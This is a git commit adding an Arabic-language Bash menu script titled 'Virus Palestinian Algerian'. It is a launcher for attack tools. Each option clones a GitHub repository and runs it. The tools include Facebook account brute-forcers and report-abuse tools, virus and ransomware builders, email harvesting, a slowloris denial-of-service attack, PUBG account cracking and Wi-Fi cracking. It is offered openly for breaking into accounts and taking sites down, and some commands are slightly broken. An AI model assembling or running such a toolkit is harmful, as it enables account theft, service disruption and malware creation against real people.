b1213c67e42d58b36beb1a888f98aa355f9f2b43
hacker ali 17 <64998647+hacker-ali-17@users.noreply.github.com>
2021-03-12 21:31:42 +0100

    Add files via upload

---
+++ Algerian.sh
@@ -0,0 +1,247 @@
+#usr/bin/bash
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+# Jangan Recode Ya gayn
+
+
+echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────────────────────────────────────"$i"["$bi"•"$i"  "
+echo $i" |"$cy"                        Virus Palestinian Algerian "$i""
+echo $i" |"$me"──────────────────────────────────────────────────────────────────────────────────────"$i"            "
+echo $i" |"$pu" AUTHOR :"$ku" HACKER ALI 17  [Algeria]"$i"          "
+echo $i" |"$pu" FACEBOOK :"$ku" https://www.facebook.com/profile.php?id=100010795364272"                      $i"    "
+echo $i" |"$pu" the organization:"$cy"المنظمة الهاكر العرب"                                                        $i       "                                                             "
+echo $i" |"$pu" Telephone number:"$ku" 0664683258"$i"                                                               "
+echo $i" |"$pu"youtube :"$ku"https://www.youtube.com/channel/UCmEkXHi9eq0jU_tBT3BfBeQ?view_as=subscriber"$i"
+ $i|"$pu" github :"$ku"https://github.com/hacker-ali-17                                                        "
+echo $i"["$bi"•"$i"]"$me"─────────────────────────────────────────────────────────────────────────────"$i"["$bi"•"$i""
+echo
+echo $i"──────────────────────────────────────────────────────────────────────────────────────"
+echo $i"|"$me" 1"$i" |"$cy" اختراق فيس بوك محدد        "$i""$i"                 "$cy" "$i" "
+echo $i"|"$me" 2"$i" |"$cy" صنع فيروسات               "$i""$i"                   "$cy" "$i" "
+echo $i"|"$me" 3"$i" |"$cy" صنع فيروسات الفدية          "$i""$i"                "$cy" "$i" "
+echo $i"|"$me" 4"$i" |"$cy"  استخراج الاميلات        "$i""$i"                   "$cy" "$i" "
+echo $i"|"$me" 5"$i" |"$cy" اسقاط المواقع بهجوم حجب الخدمه عن السيرفرات "$i""$i" "$cy" "$i" "
+echo $i"|"$me" 6"$i" |"$cy" اغلاق فيس بوك ( root )     "$i""$i"                 "$cy" "$i" "
+echo $i"──────────────────────────────────────────────────────────────────────────────────────"$i"        "$cy"  "$i" "
+echo $i"|"$me" 7"$i" |"$cy" ANGGAXD اختراق فيس بوك عشوائي كود هو "$i""$i"    "
+echo $i"|"$me" 8"$i" |"$cy" Reportاداة اغلاق فيس بوك "
+echo $i"|"$me" 9"$i" |"$cy" اداة فيها اكثر من 19 اداة "
+echo $i"|"$me"10"$i" |"$cy" 1 اختراق واي فاي              "$i""$i"                 "$cy""$i""
+echo $i"|"$me"11"$i" |"$cy" جلب معلومات الفيسبوك    "$i""$i"                  "$cy"  "$i" "
+echo $i"|"$me"12"$i" |"$cy" اختراق حسابات بوبجي       "$i""$i"                 "$cy" "$i" "
+echo $i"|"$me"13"$i" |"$cy" أدوات الفيس بوك  التلقائية        "$i""$i"                 "$cy" "$i" "
+echo $i"───────────────────────────────────────────────────────────────────────────────────────"$i"                                   "$cy" "$i"  "
+echo $i"|"$me"14"$i" |"$cy" استخراج متاحات ياهو         "$i""$i"                  "$cy"   "$i" "
+echo $i"|"$me"15"$i" |"$cy" هاكر واي فاي 2           "$i""$i"                    "$cy"  "$i" "
+echo $i"|"$me"16"$i" |"$cy" قم بتثبيت المواد أولًا  "$i""$i"                    "$cy"  "$i" "
+echo $i"───────────────────────────────────────────────────────────────────────────────────────"
+echo $i"───────────────────────────────────────────────────────────────────────────────────────"$i"                                      "$cy"  "$i" "
+echo $i"|"$me"17"$i" |"$cy" المعلومات "$i"|"$i"                 "$cy" "$i" "
+echo $me"┌==="$bi"["$i"Virus Palestinian Algerian"$bi"]"$me"======"$bi"["$i""ضع رقم اداة ""$bi"]"
+echo $me"¦"
+read -p"└──# " pil
+
+if [ $pil = 1 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/FR13ND8/fbbrute
+cd fbbrute
+php fb.php
+fi
+
+if [ $pil = 2 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/LOoLzeC/Evil-create-framework
+cd Evil-create-framework
+chmod 777 install.sh vcrt.py
+bash install.sh
+fi
+
+if [ $pil = 3 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/king-hacking/MRKING
+cd MRKING
+bash install.sh
+fi
+
+if [ $pil = 4 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/laramies/theHarvester.git
+cd theHarvester
+chmod +x theHarvester.py
+python2 theHarvester.py
+fi
+
+if [ $pil = 5 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/gkbrk/slowloris.git
+cd slowloris
+python3 slowloris.py 
+fi
+
+if [ $pil = 6 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/FR13ND8/BRUTEFORCEnew
+cd BRUTEFORCEnew
+sh new.sh
+fi
+
+if [ $pil = 7 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/anggaxd/crack  
+cd crack
+python2 crack.py
+fi
+
+if [ $pil = 8 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/IlayTamvan/Report
+cd Report
+unzip Report.zip
+python2 Report.py
+fi
+
+if [ $pil = 9 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/MoMuilWH/TmX-FW
+cd TmX-FW
+chmod 777 TmX-FW.py
+python2 TmX-FW.py
+fi
+
+if [ $pil = 10 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/v1s1t0r1sh3r3/airgeddon
+cd airgeddon
+chmod 777 airgeddon.sh
+bash airgeddon.sh
+fi
+
+if [ $pil = 11 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/FR13ND8/InfoFB
+cd InfoFB
+pip2 install -r requirements.txt
+python2 info.py
+fi
+
+if [ $pil = 12 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+pip2 install mechanize
+git clone https://github.com/nasirxo/flb2
+cd flb2
+chmod +x *
+python2 flb2.py
+fi
+
+if [ $pil = 13 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/FR13ND8/autolike
+cd autolike
+php autolike.php
+fi
+
+if [ $pil = 14 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/EmadMemo/FbYOchecker
+cd FbYOchecker
+python2 checker.py
+fi
+
+
+if [ $pil = 15 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/derv82/wifite.git
+cd ifite
+bash wifite.py
+fi
+
+
+if [ $pil = 16 ]
+then
+clear
+apt update && apt upgrade
+apt install python2
+pip2 install urllib3 chardet certifi idna requests
+pkg install git
+pip2 install mechanize
+pkg install curl
+pkg install ruby
+pkg install gem
+gem install lolcat
+pkg install git
+pkg install php
+pkg install ruby cowsay toilet figlet
+pkg install neofetch
+pkg install nano
+figlet -f slant " S U K S E S "|lolcat
+fi
+
+
+if [ $pil = 17 ]
+then
+clear
+figlet -f slant "E X I T"|lolcat
+sleep 2
+echo $cy"النعلومات  الاداة  "
+sleep 2
+echo $i"Virus Palestinian Algerian "
+echo $i"هي الاداة اختراق بالعربية  من اجل تسهيل  عليكم اختراق فيها اكثر من 30 اداة مهمة  "
+sleep 2
+echo $ku"المصمم اداة:"$i" HACKER ALI 17"
+echo $ku"رقم الهاتف :"$i" 0646683258"
+echo $ku"اسم قناتي في اليوتيوب  :"$i" المحترف في الالعاب والبرامج"
+sleep 2
+echo $pur">> شكرا لك على استخدام الاداة خاصة بي <<"
+exit
+fi
---
+++ README.md
@@ -0,0 +1,1 @@
+# Virus Palestinian Algerian 
